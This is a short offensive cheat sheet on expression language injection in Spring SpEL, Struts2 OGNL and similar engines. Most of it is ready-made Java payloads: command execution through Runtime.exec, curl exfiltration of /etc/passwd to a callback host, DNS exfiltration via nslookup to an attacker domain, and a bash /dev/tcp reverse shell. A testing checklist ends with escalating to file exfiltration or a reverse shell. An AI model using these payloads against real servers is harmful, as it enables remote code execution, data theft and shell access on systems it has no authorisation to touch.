# Expression Language Injection

Server-side expression language injection occurs when user-controlled input is evaluated as code by a template or expression engine (Spring SpEL, OGNL, MVEL, EL, SSTI). This can lead to RCE, data disclosure, and SSRF.

## Common Expression Engines

| Engine | Framework | Syntax |
|--------|-----------|--------|
| SpEL | Spring (Java) | `T(class).method()` or `#{expr}` |
| OGNL | Struts2 (Java) | `%{expr}` or `${expr}` |
| MVEL | Java (various) | Direct Java-like syntax |
| EL/UEL | JSP/JSF (Java) | `${expr}` or `#{expr}` |
| Jinja2 | Flask (Python) | `{{expr}}` |
| Twig | Symfony (PHP) | `{{expr}}` |
| Freemarker | Java | `${expr}` |

## JVM RCE Payload Patterns

**Critical**: `Runtime.exec(String)` does NOT invoke a shell — it tokenizes on whitespace. Pipes, redirects, and subshells will silently fail.

Always use the String array form with a shell wrapper:

```java
// CORRECT — shell wrapper with array form
T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","COMMAND"})

// WRONG — no shell, breaks on pipes/redirects/subshells
T(java.lang.Runtime).getRuntime().exec("bash -c COMMAND")
```

### Callback verification (blind RCE proof)

```java
T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","curl CALLBACK_URL"})
```

### File exfiltration via POST body

```java
T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","curl -d @/etc/passwd CALLBACK_URL"})
```

### DNS exfiltration (when HTTP is blocked)

```java
T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","nslookup $(whoami).ATTACKER_DOMAIN"})
```

### Reverse shell

```java
T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/LHOST/LPORT 0>&1"})
```

## Spring SpEL Injection Points

- HTTP headers: `spring.cloud.function.routing-expression`
- Request parameters evaluated by `@Value("#{...")`
- Spring Data query derivation
- SpEL in `@PreAuthorize` / `@PostAuthorize` annotations

## OGNL Injection (Struts2)

```java
// RCE via ProcessBuilder
(#rt=@java.lang.Runtime@getRuntime(),#rt.exec(new String[]{"bash","-c","COMMAND"}))

// Alternative with ProcessBuilder
(#p=new java.lang.ProcessBuilder(new String[]{"bash","-c","COMMAND"}),#p.start())
```

## Detection via Response Behavior

- Expression evaluation errors often return HTTP 500 with stack traces
- Successful `exec()` also returns 500 in many frameworks (the expression evaluates to a Process object, not a valid routing result)
- Verify RCE via out-of-band callback — do NOT rely on HTTP response codes

## Testing Methodology

1. Identify injection points (headers, parameters, JSON fields evaluated server-side)
2. Confirm expression evaluation with arithmetic: `T(java.lang.Math).abs(-1)` or `${7*7}`
3. Attempt class loading: `T(java.lang.Runtime)` — if no error, engine allows arbitrary types
4. Fire a simple OOB callback to confirm exec works
5. Escalate to file exfil or reverse shell
